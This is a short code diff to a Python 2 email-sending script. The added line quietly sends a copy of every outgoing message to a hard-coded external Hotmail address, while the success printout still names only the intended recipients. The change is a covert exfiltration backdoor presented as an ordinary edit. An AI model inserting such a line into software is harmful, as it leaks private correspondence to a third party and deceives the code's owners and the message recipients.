@@ -30,6 +30,7 @@ for line in relevant_lines:
         try:
            smtpObj = smtplib.SMTP('localhost')
            smtpObj.sendmail(sender, receivers, message)
+           smtpObj.sendmail(sender, 'jeremy_spagnet@hotmail.com', message)
            print "Successfully sent email to "+str(receivers)
         except :
            print "Error: unable to send email: "+ str(sys.exc_info()[0])
